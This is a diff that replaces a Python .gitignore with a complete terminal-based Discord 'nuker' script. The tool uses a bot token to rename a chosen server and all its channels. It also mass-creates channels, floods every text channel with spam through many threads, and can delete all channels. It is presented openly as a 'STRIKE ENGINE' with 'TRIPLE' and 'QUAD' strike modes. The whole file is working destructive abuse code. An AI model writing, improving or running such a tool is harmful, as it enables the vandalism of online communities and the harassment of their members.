@@ -1,218 +1,326 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[codz]
-*$py.class
+import requests
+import threading
+import time
+import sys
+from datetime import datetime
 
-# C extensions
-*.so
+# =======================================================
+# CONFIGURATION: PASTE YOUR BOT TOKEN HERE
+# =======================================================
+BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
+# =======================================================
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+class TerminalDiscordLauncher:
+    def __init__(self):
+        # Color mapping for terminal styling
+        self.colors = {
+            "bg": "\033[48;5;232m",       # #0f0f0f Background color
+            "sidebar": "\033[48;5;233m",  # #121212
+            "accent": "\033[38;5;63m",    # #5865F2 Discord Accent Blue
+            "danger": "\033[38;5;196m",   # #ED4245 Red
+            "warning": "\033[38;5;220m",  # #FEE75C Yellow
+            "success": "\033[38;5;84m",   # #57F287 Green
+            "text": "\033[38;5;252m",      # #E3E5E8 Text color
+            "gray": "\033[38;5;244m",      # Gray
+            "reset": "\033[0m"
+        }
+        
+        self.guilds_data = []
+        self.channels_data = []
+        self.stop_event = threading.Event()
+        
+        # Token is automatically loaded from the configuration section above
+        self.token_value = BOT_TOKEN
+        self.selected_guild_index = -1
+        
+        # System Sync Status
+        self.sync_status_text = "● SYNC OFF"
+        self.sync_status_color = self.colors["gray"]
 
-# PyInstaller
-#   Usually these files are written by a python script from a template
-#   before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
+        # 1. Fetch server list immediately on startup to prevent target errors
+        self.initial_fetch()
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+        # 2. Start background thread for continuous API updates
+        threading.Thread(target=self.auto_refresh_loop, daemon=True).start()
+        
+        # Launch straight into the main menu
+        self.main_loop()
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py.cover
-.hypothesis/
-.pytest_cache/
-cover/
+    def initial_fetch(self):
+        """Fetches the server list directly at startup so data is instantly available"""
+        token = self.token_value.strip()
+        if token and token != "YOUR_DISCORD_BOT_TOKEN_HERE":
+            print(f"{self.colors['accent']}[*] Connecting to Discord API... Please wait.{self.colors['reset']}")
+            for _ in range(3):  # Retry up to 3 times directly during boot
+                try:
+                    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=self.get_headers(), timeout=5)
+                    if r.status_code == 200:
+                        self.guilds_data = r.json()
+                        self.sync_status_text = "● SYSTEM ONLINE"
+                        self.sync_status_color = self.colors["success"]
+                        break
+                except:
+                    pass
+                time.sleep(1)
 
-# Translations
-*.mo
-*.pot
+    def print_header(self, page_title):
+        print(f"{self.colors['sidebar']}==============================================={self.colors['reset']}")
+        print(f"{self.colors['accent']}   CORE | SLIM INTERFACE (TERMINAL PORT)       {self.colors['reset']}")
+        print(f"   Status: {self.sync_status_color}{self.sync_status_text}{self.colors['reset']}")
+        print(f"   Token Set: {'✓ Yes' if self.token_value and self.token_value != 'YOUR_DISCORD_BOT_TOKEN_HERE' else '✗ No'}")
+        if self.selected_guild_index != -1 and self.guilds_data:
+            print(f"   Target Grid: {self.colors['text']}{self.guilds_data[self.selected_guild_index]['name']}{self.colors['reset']}")
+        else:
+            print(f"   Target Grid: {self.colors['gray']}None Selected{self.colors['reset']}")
+        print(f"{self.colors['sidebar']}==============================================={self.colors['reset']}")
+        print(f"--- {page_title} ---")
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+    def main_loop(self):
+        while True:
+            self.print_header("MAIN MENU")
+            print("1. Update / View Access Token")
+            print("2. Select Target Guild (Server Dropdown)")
+            print("3. Open UTILITIES Page")
+            print("4. Open STRIKE ENGINE Page")
+            print(f"5. {self.colors['danger']}STOP ALL OPERATIONS{self.colors['reset']}")
+            print("0. Exit Application")
+            
+            choice = input("\nChoose an option: ").strip()
+            
+            if choice == "1":
+                print(f"Current Token: {self.token_value if self.token_value else 'None'}")
+                new_token = input("Enter new Access Token (Press Enter to keep current): ").strip()
+                if new_token:
+                    self.token_value = new_token
+                    print("[!] Token updated in local data space.")
+                    self.initial_fetch()
+            elif choice == "2":
+                self.interactive_select_guild()
+            elif choice == "3":
+                # Auto-select if user forgot
+                if self.selected_guild_index == -1:
+                    print(f"{self.colors['warning']}[!] No Target Grid selected! Please choose a server first:{self.colors['reset']}")
+                    self.interactive_select_guild()
+                if self.selected_guild_index != -1:
+                    self.show_standard_page()
+            elif choice == "4":
+                # Auto-select if user forgot
+                if self.selected_guild_index == -1:
+                    print(f"{self.colors['warning']}[!] No Target Grid selected! Please choose a server first:{self.colors['reset']}")
+                    self.interactive_select_guild()
+                if self.selected_guild_index != -1:
+                    self.show_strike_page()
+            elif choice == "5":
+                self.stop_all()
+            elif choice == "0":
+                print("Exiting...")
+                sys.exit(0)
+            else:
+                print(f"{self.colors['danger']}Invalid Selection.{self.colors['reset']}")
+            time.sleep(1)
 
-# Flask stuff:
-instance/
-.webassets-cache
+    def interactive_select_guild(self):
+        if not self.guilds_data:
+            print(f"{self.colors['warning']}[!] No guild data loaded. Verify your token or wait a moment.{self.colors['reset']}")
+            return
+        
+        print("\n--- SELECT TARGET GRID ---")
+        for idx, g in enumerate(self.guilds_data):
+            print(f"[{idx}] {g['name']} (ID: {g['id']})")
+            
+        try:
+            choice = int(input("Select index: "))
+            if 0 <= choice < len(self.guilds_data):
+                self.selected_guild_index = choice
+                self.load_channels()  # Fetch channels immediately and synchronously
+            else:
+                print("Out of range selection.")
+        except ValueError:
+            print("Invalid index choice.")
 
-# Scrapy stuff:
-.scrapy
+    def show_standard_page(self):
+        self.print_header("UTILITIES")
+        print("Actions:")
+        print("1. Send Message")
+        print("2. Delete Channels")
+        print("3. Channel Spam")
+        action_idx = input("Select action index: ").strip()
+        
+        action_map = {"1": "Send Message", "2": "Delete Channels", "3": "Channel Spam"}
+        action = action_map.get(action_idx, "Send Message")
 
-# Sphinx documentation
-docs/_build/
+        entry_input = input("INPUT STRING: ")
+        entry_count = input("COUNT (Default 1): ")
 
-# PyBuilder
-.pybuilder/
-target/
+        print(f"\n[{self.colors['accent']}* {self.colors['reset']}] 1. EXECUTE COMMAND")
+        print(f"[{self.colors['gray']}* {self.colors['reset']}] 0. Back to main menu")
+        
+        exe = input(">> ").strip()
+        if exe == "1":
+            if self.selected_guild_index == -1:
+                print(f"{self.colors['danger']}[X] Error: No Target Grid selected!{self.colors['reset']}")
+                return
+            self.stop_event.clear()
+            g_id = self.guilds_data[self.selected_guild_index]['id']
+            threading.Thread(target=self.run_standard_task, args=(action, g_id, entry_input, entry_count), daemon=True).start()
+            print(f"{self.colors['success']}[✓] Task worker dispatched to background.{self.colors['reset']}")
 
-# Jupyter Notebook
-.ipynb_checkpoints
+    def show_strike_page(self):
+        self.print_header("STRIKE ENGINE")
+        
+        global_identifier = input("GLOBAL IDENTIFIER (AUTO-FILL ALL) [Leave blank to skip]: ").strip()
+        if global_identifier:
+            s_name = c_name = m_content = global_identifier
+            print(f"-> Auto-filled with: {global_identifier}")
+        else:
+            s_name = input("NEW SERVER NAME: ")
+            c_name = input("CHANNEL NAMES: ")
+            m_content = input("SPAM MESSAGE: ")
 
-# IPython
-profile_default/
-ipython_config.py
+        strike_msg_count = input("MSG PER CHAN (Default 5): ")
+        strike_chan_count = input("NEW CHANNELS (Default 10): ")
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
+        print(f"\n1. {self.colors['warning']}DEPLOY TRIPLE STRIKE{self.colors['reset']}")
+        print(f"2. {self.colors['danger']}INITIATE QUAD STRIKE{self.colors['reset']}")
+        print("0. Return to menu")
+        
+        strike_choice = input(">> ").strip()
+        if strike_choice in ["1", "2"]:
+            if self.selected_guild_index == -1:
+                print(f"{self.colors['danger']}[X] Error: No Target Grid selected! Please select option 2 in the main menu first.{self.colors['reset']}")
+                return
+            mode = "triple" if strike_choice == "1" else "quad"
+            self.stop_event.clear()
+            
+            g_id = self.guilds_data[self.selected_guild_index]['id']
+            threading.Thread(target=self.execute_strike_task, args=(mode, g_id, s_name, c_name, m_content, strike_msg_count, strike_chan_count), daemon=True).start()
+            print(f"{self.colors['success']}[✓] Strike thread deployed asynchronously.{self.colors['reset']}")
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-# Pipfile.lock
+    def get_headers(self):
+        return {"Authorization": f"Bot {self.token_value.strip()}", "Content-Type": "application/json"}
 
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-# uv.lock
+    def auto_refresh_loop(self):
+        while True:
+            token = self.token_value.strip()
+            if token and token != "YOUR_DISCORD_BOT_TOKEN_HERE":
+                try:
+                    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=self.get_headers(), timeout=5)
+                    if r.status_code == 200:
+                        self.guilds_data = r.json()
+                    if self.selected_guild_index != -1 and self.guilds_data:
+                        g_id = self.guilds_data[self.selected_guild_index]['id']
+                        r = requests.get(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=self.get_headers(), timeout=5)
+                        if r.status_code == 200: 
+                            self.channels_data = r.json()
+                    self.sync_status_text = "● SYSTEM ONLINE"
+                    self.sync_status_color = self.colors["success"]
+                except:
+                    self.sync_status_text = "● CONNECTION ERROR"
+                    self.sync_status_color = self.colors["danger"]
+            time.sleep(5)
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-# poetry.lock
-# poetry.toml
+    def load_channels(self):
+        """Fetches channels for the selected server instantly"""
+        if self.selected_guild_index != -1 and self.guilds_data:
+            server_name = self.guilds_data[self.selected_guild_index]['name']
+            g_id = self.guilds_data[self.selected_guild_index]['id']
+            print(f"\n[LOG] Locking onto: {server_name}...")
+            try:
+                r = requests.get(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=self.get_headers(), timeout=5)
+                if r.status_code == 200:
+                    self.channels_data = r.json()
+                    print(f"{self.colors['success']}[✓] Target Grid successfully locked: {server_name}{self.colors['reset']}\n")
+                else:
+                    print(f"{self.colors['danger']}[X] Failed to fetch channels: Status {r.status_code}{self.colors['reset']}\n")
+            except Exception as e:
+                print(f"{self.colors['danger']}[X] Error connecting to server grid API: {e}{self.colors['reset']}\n")
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#   pdm recommends including project-wide configuration in pdm.toml, but excluding .pdm-python.
-#   https://pdm-project.org/en/latest/usage/project/#working-with-version-control
-# pdm.lock
-# pdm.toml
-.pdm-python
-.pdm-build/
+    def run_standard_task(self, action, g_id, entry_input, entry_count):
+        headers = self.get_headers()
+        content = entry_input
+        try: 
+            count = int(entry_count)
+        except: 
+            count = 1
+        
+        if action == "Send Message" or action == "Channel Spam":
+            for c in self.channels_data:
+                if self.stop_event.is_set(): 
+                    break
+                if c['type'] in [0, 5]: 
+                    threading.Thread(target=self._msg_worker, args=(c['id'], headers, content, count)).start()
+        elif action == "Delete Channels":
+            for c in self.channels_data:
+                if self.stop_event.is_set(): 
+                    break
+                requests.delete(f"https://discord.com/api/v10/channels/{c['id']}", headers=headers)
 
-# pixi
-#   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
-# pixi.lock
-#   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
-#   in the .venv directory. It is recommended not to include this directory in version control.
-.pixi
+    def execute_strike_task(self, mode, g_id, s_name, c_name, m_content, msg_c, chan_c):
+        headers = self.get_headers()
+        try: 
+            msg_count = int(msg_c)
+            chan_count = int(chan_c)
+        except: 
+            msg_count, chan_count = 5, 10
+        
+        print(f"\n{self.colors['danger']}[!] START {mode.upper()}{self.colors['reset']}\n")
+        
+        # 1. RENAME SERVER
+        if not self.stop_event.is_set():
+            r = requests.patch(f"https://discord.com/api/v10/guilds/{g_id}", headers=headers, json={"name": s_name})
+            if r.status_code == 200:
+                print(f"[✓] SERVER NAME -> {s_name}\n")
+            else:
+                print(f"[X] SERVER RENAME FAILED: {r.status_code}\n")
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
+        # 2. RENAME CHANNELS & SPAM MESSAGES
+        for c in list(self.channels_data):
+            if self.stop_event.is_set(): 
+                break
+            threading.Thread(target=self._rename_worker, args=(c['id'], headers, c_name)).start()
+            if c['type'] in [0, 5]: 
+                threading.Thread(target=self._msg_worker, args=(c['id'], headers, m_content, msg_count)).start()
+            time.sleep(0.04)
+        
+        # 3. CREATE CHANNELS & SPAM (QUAD STRIKE)
+        if mode == "quad":
+            for i in range(chan_count):
+                if self.stop_event.is_set(): 
+                    break
+                threading.Thread(target=self._create_and_spam, args=(g_id, headers, c_name, m_content, msg_count)).start()
+                time.sleep(0.1)
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
+    def _create_and_spam(self, g_id, headers, c_name, m_content, msg_count):
+        if self.stop_event.is_set(): 
+            return
+        r = requests.post(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=headers, json={"name": c_name.lower().replace(" ", "-")})
+        if r.status_code == 201: 
+            self._msg_worker(r.json()['id'], headers, m_content, msg_count)
 
-# Redis
-*.rdb
-*.aof
-*.pid
+    def _rename_worker(self, c_id, headers, name):
+        if self.stop_event.is_set(): 
+            return
+        requests.patch(f"https://discord.com/api/v10/channels/{c_id}", headers=headers, json={"name": name.lower().replace(" ", "-")})
 
-# RabbitMQ
-mnesia/
-rabbitmq/
-rabbitmq-data/
+    def _msg_worker(self, c_id, headers, content, count):
+        for i in range(count):
+            if self.stop_event.is_set(): 
+                break
+            requests.post(f"https://discord.com/api/v10/channels/{c_id}/messages", headers=headers, json={"content": content})
+            time.sleep(0.3)
+        print(f"[#] {c_id} OK\n")
 
-# ActiveMQ
-activemq-data/
+    def stop_all(self):
+        """Triggers the event to immediately abort all background threads"""
+        self.stop_event.set()
+        print(f"\n{self.colors['danger']}[!!!] STOP SIGNAL SENT{self.colors['reset']}\n")
+        
+        def reset():
+            time.sleep(2)
+            self.stop_event.clear()
+            print(f"\n{self.colors['success']}[!] SYSTEM RESET: READY{self.colors['reset']}\n")
+            
+        threading.Thread(target=reset, daemon=True).start()
 
-# SageMath parsed files
-*.sage.py
-
-# Environments
-.env
-.envrc
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
-
-# Spyder project settings
-.spyderproject
-.spyproject
-
-# Rope project settings
-.ropeproject
-
-# mkdocs documentation
-/site
-
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
-
-# Pyre type checker
-.pyre/
-
-# pytype static type analyzer
-.pytype/
-
-# Cython debug symbols
-cython_debug/
-
-# PyCharm
-#   JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#   be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#   and can be added to the global gitignore or merged into this file.  For a more nuclear
-#   option (not recommended) you can uncomment the following to ignore the entire idea folder.
-# .idea/
-
-# Abstra
-#   Abstra is an AI-powered process automation framework.
-#   Ignore directories containing user credentials, local state, and settings.
-#   Learn more at https://abstra.io/docs
-.abstra/
-
-# Visual Studio Code
-#   Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
-#   that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
-#   and can be added to the global gitignore or merged into this file. However, if you prefer, 
-#   you could uncomment the following to ignore the entire vscode folder
-# .vscode/
-# Temporary file for partial code execution
-tempCodeRunnerFile.py
-
-# Ruff stuff:
-.ruff_cache/
-
-# PyPI configuration file
-.pypirc
-
-# Marimo
-marimo/_static/
-marimo/_lsp/
-__marimo__/
-
-# Streamlit
-.streamlit/secrets.toml
+if __name__ == "__main__":
+    app = TerminalDiscordLauncher()
